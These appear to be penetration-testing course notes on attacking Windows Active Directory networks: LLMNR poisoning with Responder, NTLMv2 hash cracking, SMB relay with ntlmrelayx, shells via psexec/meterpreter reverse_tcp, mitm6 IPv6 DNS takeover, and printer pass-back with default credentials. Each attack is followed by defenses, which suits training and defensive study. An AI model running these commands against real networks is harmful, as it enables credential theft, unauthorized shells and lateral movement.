We will abuse features of Windows.
Know these 5 attacks: Top Five Ways I Got Domain Admin - [https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)

# LLMNR Poisoning Overview
_Link-Local Multicast Name Resolution_ (LLMNR) and NetBIOS are two name resolution services built in to Windows **to help systems find address names from other devices on the network**.
- used to identify hosts when DNS fails to do so
- previously NBT-NS
- KEY FLAW - the services utilize a user's username and NTLMv2 hash when appropriately responded to

LLMNR = mitm attack
1. We run `Responder` for LLMNR poisoning
- In engagement, Heath runs first thing in the morning >> need a lot of traffic, trying to capture hashes
```bash
python Responder.py -l tun0 -rdw
```
2. An event occurs
3. Observe, get the hashes 
4. Crack hashes in hashcat
```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

## Capturing NTLMv2 Hashes with Responder
*need impacket installed*
```bash
#first tab
responder -I eth0 -rdwv #most common options

```

```bash
#second tab, will need one for hashcat
```

## Password Cracking with Hashcat
**Always run on BASE OS to utilize graphics card**
https://hashcat.net/hashcat/ --- download binaries 
If cracking in Kali / VM:
```bash
#save and copy hash from responder
hashcat -m 5600 ntlmhas.txt rockyou.txt # -m = module, 5600 = number
```
If Local: have directory for hashcat >> save and copy file of hashes to local directory >> start local terminal 
```powershell
cd c:\users\[user]\desktop\hashcat-4.2.1 #select path of directory
hashcat64.exe -m 5600 [hash file name] rockyou.txt -o #o = optimized, best practice to use
```

## LLMNR Poisoning Defense
- BEST defense is to disable LLMNR and NBT-NS
	- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under local computer policy > computer configuration > administrative templates > network > DNS client in the Group Policy Editor
	- To disable NBT-NS, navigate to network connections > network adapter properties > TCP/IPv4 properties > advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP"
- If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
	- enable/require Network Access Control (NAC)
	- require strong user passwords (e.g., >14 characters in length and limit common word usage). The more complex and long the password, the harder it is for an attacker to crack the hash

# SMB Relay Attacks Overview
What is SMB Relay?
- instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access
Requirements
- `SMB signing` must be disabled on the target
- relayed user credentials must be admin on machine
SMB Relay
1. config responder >> in responder.conf turn off SMB and HTTP >> we will be listening but not responding, just using responder to capture
2. run responder
```bash
python Responder.py -l tun0 -rdw
```
3. set up your relay
```bash
python ntlmrelayx.pty -tf targets.txt -smb2support
```
4. an event ocurs >> relays credentials 
5. Win >> dumping out SAM file (usernames and hashes for local users on device) >> can now crack hashes or pass the hash

## Discovering Hosts with SMB Signing Disabled
We need to tell which hosts have SMB enabled 
can use nessus
using NMAP:
```bash
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
#note down applicable target IPs >> targets.txt

#set up responder config, SMB and HTTP off
gedit /etc/responder/Responder.conf
#run responder
responder -I eth0 -rdwv

#new tab to set up relay
```

```bash
#relay tab
ntlmrelayx.py -tf targets.txt -smb2support #starts relay server
```
- observe >> copy and save hashes 

- starting interactive relay
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i #i = interactive
```
- new listener tab >> use port from relay tab
```bash
nc 127.0.0.1 11000 #port 11000 from interactive relay tab
help #commands for SMB shell

#we are in, so can execute whatever commands we want now
```
interactive shell options for to exploit:
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i -e test.exe #e = execute, can setup meterpreter listener and an exe payload in msfvenom

ntlmrelayx.py -tf targets.txt -smb2support -i -c #executes commands when we run the machine, can be a powershell script to give us shell
```

## SMB Relay Attack Defenses
**Mitigation Strategies**
SMB signing should be disabled and local admin restricted
- enable SMB signing on all devices
	- pros - completely stops attack
	- con - can cause performance issues with file copies
- disable NTLM authentication on network
	- pro: completely stops attack
	- cons: if kerberos stops working, windows defaults back to NTLM
- account tiering:
	- pro - limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
	- con - enforcing the policy may be difficult
- local admin restriction:
	- pro - can prevent a lot of lateral movement
	- con - potential increase in the amount of service desk tickets

## Gaining Shell Access
now that we have a credential from SMB, what can we do?
Try different tools for exploit:
1. metasploit psexec
```bash
msfconsole
search psexec
use 10
set rhost [target IP]
set smbdomain marvel.local
set smbpass Password1
set smbuser fcastle
options # check

#need to run with appropriate payload
set payload windows/x64/meterpreter/reverse_tcp
options #check
set lhost eth0
run
#may need to try more than once, if not working need to tweak
show targets
set target 2 #select from list
run
```

2. psexec.py
```bash
psexec.py --help #for tool info
psexec.py marvel.local/fcastle:Password@192.168.57.141 #user, pass, and IP
#if works can try smbexec and wmiexec 
smbexec.py marvel.local/fcastle:Password@192.168.57.141 #smb
wmiexec.py marvel.local/fcastle:Password@192.168.57.141 #wmi
```

heath tip - psexec is noisy, start with smb or wmi to see if you can get shell >> if shell, can navigate C drive and issue commands >> figure out if AV is running, disable to run meterpreter

# IPv6 Attacks
`DNS takeover` attack is heath go-to 
*need mitm6 installed* - https://github.com/dirkjanm/mitm6
- mitm6: [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- Combining NTLM Relays and Kerberos Delegation: [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

IPv6 DNS Takeover via mitm6
```bash
ntlmrelayx.py -6 -t ldaps://[domain contoller IP] -wh fakewpad.marvel.local -l lootme #-l = loot directory
cd lootme
ls #see collected loot
firefox domain_users_by_group.html #gold table

# >> keep mitm connection alive, observer and save any juicy captured information
```

## IPv6 Defenses
Mitigation Strategies
- disable IPv6
- recommended: block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy
- is WPAD is not in use, disable
- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding
- consider admin users to the protected users group or marking them as account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation

# Passback Attacks
Printer attack
A Pen Tester’s Guide to Printer Hacking - [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

looking for something that has a connection to LDAP or SMB, something we can utilize

#### **Introducing the Pass-Back Attack**
The stored LDAP credentials are usually located on the network settings tab in the online configuration of the MFP and can typically be accessed via the Embedded Web Service (EWS). If you can reach the EWS and modify the LDAP server field by replacing the legitimate LDAP server with your malicious LDAP server, then the next time an LDAP query is conducted from the MFP, it will attempt to authenticate to your LDAP server using the configured credentials or the user-supplied credentials. 

#### **Accessing the EWS**
Most MFPs ship with a set of default administrative credentials to access the EWS. These credentials are usually located in the Administrator Guide of the MFP in question and are a good place to start for initial access:
VendorUsernamePasswordRicohadminblankHPadminadmin or blankCanonADMINcanonEpsonEPSONWEBadmin

Another way to potentially access the EWS is through the Printer Exploitation Toolkit (PRET) and Praeda. Both tools are capable of Information Disclosure and Code Execution. If you are looking to utilize the tools for the first time, here are a few resources to help you get started:
-   • [https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET) 
-   • [https://github.com/percx/Praeda](https://github.com/percx/Praeda) 
-   • [http://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet](https://www.hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet)

# Other Attack Vectors and Strategies
❗️ **Strategies**
- begin day with mitm6 or responder
- run scans to generate traffic
- if scans are taking too long, look for websites in scope (http_version)
- look for default credentials on web logins
	- printers
	- jenkins
	- etc
- think outside the box

